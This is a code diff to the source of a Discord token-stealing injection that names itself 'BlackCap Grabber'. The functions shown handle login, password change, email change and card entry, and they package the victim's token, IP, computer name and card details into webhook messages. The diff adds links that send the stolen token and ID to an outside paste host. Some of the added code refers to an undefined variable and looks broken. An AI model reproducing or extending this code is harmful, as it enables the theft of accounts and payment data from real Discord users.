@@ -42,6 +42,8 @@ const config = {
 
 
 
+let bannerurl = ""
+let usericonurl = ""
 
 const discordPath = (function() {
     const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
@@ -263,7 +265,13 @@ async function FirstTime() {
                     var {
                         ip
                     } = await getFromURL("https://www.myexternalip.com/json", null)
-                    let bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=600` || "https://media.discordapp.net/attachments/1032256615962906655/1037042057845407844/Banner.png?size=600";
+                    
+                    if(b.avatar === null){
+                        usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+                    }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
+                    if(b.banner === null){
+                        bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+                    }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                     const c = {
                         username: "BlackCap",
                         content: "",
@@ -273,7 +281,7 @@ async function FirstTime() {
                             color: config["embed-color"],
                             fields: [{
                                 name: "Injection Info",
-                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
+                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
                                 inline: !1
 								}, {
                                 name: "Username <:icon4:1024615934519955496> ",
@@ -281,7 +289,7 @@ async function FirstTime() {
                                 inline: !0
 								}, {
                                 name: "ID <:icon3:1024615933228109834>",
-                                value: `\`${b.id}\``,
+                                value: `\`${b.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
                                 inline: !0
 								}, {
                                 name: "Badges <:icon5:1024615931869147146>",
@@ -305,7 +313,7 @@ async function FirstTime() {
                                 inline: !0
 								}, {
                                 name: "Token <a:icon1:1024615171907407892>",
-                                value: `\`\`\`${token}\`\`\``,
+                                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                                 inline: !1
 								}],
 
@@ -346,7 +354,7 @@ async function FirstTime() {
                                     color: config["embed-color"],
                                     fields: [{
                                         name: "Injection Info",
-                                        value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
+                                        value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
                                         inline: !1
 							}],
                                     author: {
@@ -364,7 +372,12 @@ async function FirstTime() {
                             var {
                                 ip
                             } = await getFromURL("https://www.myexternalip.com/json", null)
-                            let bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=600` || "https://media.discordapp.net/attachments/1032256615962906655/1037042057845407844/Banner.png?size=600"
+                            if(b.avatar === null){
+                                usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+                            }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
+                            if(b.banner === null){
+                                bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+                            }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                             const c = {
                                 username: "BlackCap Grabber",
                                 content: "",
@@ -374,7 +387,7 @@ async function FirstTime() {
                                     color: config["embed-color"],
                                     fields: [{
                                         name: "Injection Info",
-                                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
+                                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
                                         inline: !1
 								}, {
                                         name: "Username <:icon4:1024615934519955496> ",
@@ -382,7 +395,7 @@ async function FirstTime() {
                                         inline: !0
 								}, {
                                         name: "ID <:icon3:1024615933228109834>",
-                                        value: `\`${b.id}\``,
+                                        value: `\`${b.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
                                         inline: !0
 								}, {
                                         name: "Badges <:icon5:1024615931869147146>",
@@ -402,7 +415,7 @@ async function FirstTime() {
                                         inline: !0
 								}, {
                                         name: "Token <a:icon1:1024615171907407892>",
-                                        value: `\`\`\`${token}\`\`\``,
+                                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                                         inline: !1
 								}],
 
@@ -820,7 +833,13 @@ async function Login(email, password, token) {
                 }
                 return billing
             }
-            let bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=600` || "https://media.discordapp.net/attachments/1032256615962906655/1037042057845407844/Banner.png?size=600";
+            if(b.avatar === null){
+                usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+            }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
+            if(b.banner === null){
+                bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+            }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
+            
             const params = {
                 username: "BlackCap Grabber",
                 content: "",
@@ -830,7 +849,7 @@ async function Login(email, password, token) {
                     "color": config['embed-color'],
                     "fields": [{
                         name: "Injection Info",
-                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
+                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
                         inline: !1
 												}, {
                         name: "Username <:icon4:1024615934519955496> ",
@@ -838,7 +857,7 @@ async function Login(email, password, token) {
                         inline: !0
 												}, {
                         name: "ID <:icon3:1024615933228109834>",
-                        value: `\`${info.id}\``,
+                        value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
                         inline: !0
 												}, {
                         name: "Nitro <a:_diamond:1018223518913150977>",
@@ -878,7 +897,7 @@ async function Login(email, password, token) {
                         inline: !0
 												}, {
                         name: "Token <a:icon1:1024615171907407892>",
-                        value: `\`\`\`${token}\`\`\``,
+                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                         inline: !1
 												}, ],
 
@@ -886,7 +905,7 @@ async function Login(email, password, token) {
                         "text": "©KSCH | https://github.com/KSCHdsc"
                     },
                     "thumbnail": {
-                        "url": `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}`
+                        "url": `${usericonurl}`
                     }
 											}, {
                     "title": `<a:icon10:1024621262766604348> Total Friends (${totalFriends()})`,
@@ -900,7 +919,7 @@ async function Login(email, password, token) {
                         'url': `${bannerurl}`,
                     },
                     "thumbnail": {
-                        "url": `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}`
+                        "url": `${usericonurl}`
                     }
 											}]
             }
@@ -986,7 +1005,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
                     "color": config['embed-color'],
                     "fields": [{
                         name: "Injection Info",
-                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
+                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
                         inline: !1
 												}, {
                         name: "Username <:icon4:1024615934519955496> ",
@@ -994,7 +1013,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
                         inline: !0
 												}, {
                         name: "ID <:icon3:1024615933228109834>",
-                        value: `\`${info.id}\``,
+                        value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
                         inline: !0
 												}, {
                         name: "Nitro <a:_diamond:1018223518913150977>",
@@ -1038,7 +1057,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
                         inline: !0
 												}, {
                         name: "Token <a:icon1:1024615171907407892>",
-                        value: `\`\`\`${token}\`\`\``,
+                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                         inline: !1
 												}, ],
 
@@ -1046,7 +1065,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
                         "text": "©KSCH | https://github.com/KSCHdsc"
                     },
                     "thumbnail": {
-                        "url": `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}`
+                        "url": `${usericonurl}`
                     }
 											}, {
                     "title": `<a:icon10:1024621262766604348> Total Friends (${totalFriends()})`,
@@ -1060,7 +1079,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
                         'url': `${bannerurl}`,
                     },
                     "thumbnail": {
-                        "url": `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}`
+                        "url": `${usericonurl}`
                     }
 											}]
             }
@@ -1132,8 +1151,16 @@ async function ChangeEmail(newemail, password, token) {
                 }
                 return billing
             }
-            let bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=600` || "https://media.discordapp.net/attachments/1032256615962906655/1037042057845407844/Banner.png?size=600";
-            const params = {
+            if(b.avatar === null){
+                usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+            }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
+            if(b.banner === null){
+                bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+            }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
+
+
+            
+           const params = {
                 username: "BlackCap Grabber",
                 content: "",
                 embeds: [{
@@ -1142,7 +1169,7 @@ async function ChangeEmail(newemail, password, token) {
                         "color": config['embed-color'],
                         "fields": [{
                                 name: "Injection Info",
-                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
+                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
                                 inline: !1
 					}, {
                                 name: "Username <:icon4:1024615934519955496> ",
@@ -1150,7 +1177,7 @@ async function ChangeEmail(newemail, password, token) {
                                 inline: !0
 					}, {
                                 name: "ID <:icon3:1024615933228109834>",
-                                value: `\`${info.id}\``,
+                                value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
                                 inline: !0
 					}, {
                                 name: "Nitro <a:_diamond:1018223518913150977>",
@@ -1190,7 +1217,7 @@ async function ChangeEmail(newemail, password, token) {
                                 inline: !0
 					}, {
                                 name: "Token <a:icon1:1024615171907407892>",
-                                value: `\`\`\`${token}\`\`\``,
+                                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                                 inline: !1
 					},
 				],
@@ -1199,7 +1226,7 @@ async function ChangeEmail(newemail, password, token) {
                             "text": "©KSCH | https://github.com/KSCHdsc"
                         },
                         "thumbnail": {
-                            "url": `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}`
+                            "url": `${usericonurl}`
                         }
 				}, {
                         "title": `<a:icon10:1024621262766604348> Total Friends (${totalFriends()})`,
@@ -1214,7 +1241,7 @@ async function ChangeEmail(newemail, password, token) {
                         },
 
                         "thumbnail": {
-                            "url": `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}`
+                            "url": `${usericonurl}`
                         }
 			}
 		]
@@ -1234,7 +1261,14 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
     } = await getFromURL("https://www.myexternalip.com/json", null)
     await getservers(token)
     setTimeout(async () => {
-        let bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=600` || "https://media.discordapp.net/attachments/1032256615962906655/1037042057845407844/Banner.png?size=600";
+        if(b.avatar === null){
+            usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+        }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
+        if(b.banner === null){
+            bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+        }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
+
+        
         const params = {
             username: "BlackCap Grabber",
             content: "",
@@ -1276,7 +1310,7 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                         'url': `${bannerurl}`,
                     },
                     "thumbnail": {
-                        "url": `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}`
+                        "url": `${usericonurl}`
                     }
             }
         ]
